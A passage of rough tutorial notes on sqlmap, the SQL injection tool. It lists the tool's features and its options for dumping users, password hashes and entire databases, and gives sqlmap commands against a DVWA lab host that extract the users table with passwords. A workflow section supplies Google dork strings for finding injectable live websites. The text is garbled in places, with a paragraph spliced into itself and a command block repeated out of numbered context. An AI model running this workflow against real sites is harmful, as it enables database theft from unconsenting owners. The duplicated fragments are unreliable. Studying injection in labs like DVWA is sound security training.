			SQLMAP

Intoduction:

1. It is a open source tools developed in Python to detect/use 
sql injection in better and simpler way
2. As per official site "sqlmap is an open source penetration 
testing tool that automates the 
process of detecting and exploiting SQL injection flaws and 
taking over of database servers."
3. Developers: Bernardo Damele A. G. (@bdamele), Miroslav Stampar (@stamparm)

Features:

 •Full support for MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, 
IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB and HSQLDB database management systems. 

Full support for five SQL injection techniques: boolean-based blind, time-based blind,
 error-based, UNION query and stacked queries.

It is possible to provide a single target URL, get the list of targets 
from Burp proxy or WebScarab proxy requests log files, 
get the whole HTTP request from a text file or get the It is possible to provide a 
single target URL, get the list of targets from Burp proxy or WebScarab proxy requests log files, 
get the whole HTTP request from a text file or get the list of targets by providing sqlmap with a Google 
dork which queries Google search engine and parses its results page. You can also define a regular-expression 
based scope that is used to identify which of the parsed addresses to test.list of targets by providing sqlmap with 
a Google dork which queries Google search engine and parses its results page. You can also define a regular-expression 
based scope that is used to identify which of the parsed addresses to test.

Support to execute arbitrary commands and retrieve their standard output on the database server underlying operating 
system when the database software is MySQL, PostgreSQL or Microsoft SQL Server.

support to dump database tables entirely

Extracting information with SQLMAP using options:

RECOVER SESSION USER USING SQLMAP. --current-user 
DETECT CURRENT DATABASE USING SQLMAP. --current-db 
FIND OUT IF SESSION USER IS DATABASE ADMINISTRATOR USING SQLMAP. --is-dba 
LIST DATABASE SYSTEM USERS USING SQLMAP. --users 
LIST DATABASES USING SQLMAP. --dbs 
DBMS SERVER HOSTNAME. --hostname 
DBMS EXACT VERSION, OS INFORMATION, ARCHITECTURE AND PATCH LEVEL. -f
Extracting Information With Sqlmap LIST THE DBMS USERS. --users 
LIST ALL DBMS USERS, PASSWORD HASHES --passwords 
LIST USERS PRIVILEGES. --privileges 
LIST ALL COLUMNS or JUST FOR A SPECIFIC TABLE FROM DATABASE --columns (-T <table name> -D <database>) 
EXECUTING A CUSTOM SQL QUERY. --sql-query=“<sql query to execute>” 
SQL SHELL TO EXECUTE ALL YOUR CUSTOM SQL QUERIES --sql-shell
Extracting Information With Sqlmap DBMS database to enumerate -D (Database_name) 
DBMS database table(s) to enumerate -T (table_name) 
DBMS database table column(s) to enumerate -C (columns_name)
Dump DBMS database table entries --dump 
Dump all DBMS databases tables entries --dump-all 
Enumerate DBMS database tables --tables 
Enumerate DBMS users roles --roles
Extracting Information With Sqlmap Retrieve DBMS banner -b, --banner List tables of target database using SQLMAP SQL Injection Sqlmap –u http://172.25.25.102/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit# -cookie= ”PHPSESSID=lu4bqq7h7bali86bs6hadfscd6; security=low” –D dvwa --tables
17. List columns on target table of selected database using SQLMAP SQL Injection Sqlmap –u http://172.25.25.102/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit# -cookie= ”PHPSESSID=lu4bqq7h7bali86bs6hadfscd6; security=low” –D dvwa -T users --columns
18. List user and password from target columns of target table of selected database using SQLMAP SQL Injection Sqlmap –u http://172.25.25.102/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit# -cookie= ”PHPSESSID=lu4bqq7h7bali86bs6hadfscd6; security=low” –D dvwa -T users –C user,user_id,password --dump 
Enumerate DBMS schema --schema 
Retrieve DBMS comments --comments 

Sqlmap: Workflow

Find a vulnerable website • 
Google Dorks strings to find Vulnerable SQLMAP SQL injectable website 
•inurl:product-item.php?id= •inurl:news.php?catid= •inurl:index.php?id= 
•inurl:title.php?id= •Identify possible injections points 
•Identify SQLI vulnerabilities: 
•By using sqlmap 
•Manual testing 
•Exploit SQLi vulnerabilities 


List tables of target database using SQLMAP SQL Injection Sqlmap –u http://172.25.25.102/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit# -cookie= ”PHPSESSID=lu4bqq7h7bali86bs6hadfscd6; security=low” –D dvwa --tables
17. List columns on target table of selected database using SQLMAP SQL Injection Sqlmap –u http://172.25.25.102/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit# -cookie= ”PHPSESSID=lu4bqq7h7bali86bs6hadfscd6; security=low” –D dvwa -T users --columns
18. List user and password from target columns of target table of selected database using SQLMAP SQL Injection Sqlmap –u http://172.25.25.102/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit# -cookie= ”PHPSESSID=lu4bqq7h7bali86bs6hadfscd6; security=low” –D dvwa -T users –C user,user_id,password --dump 






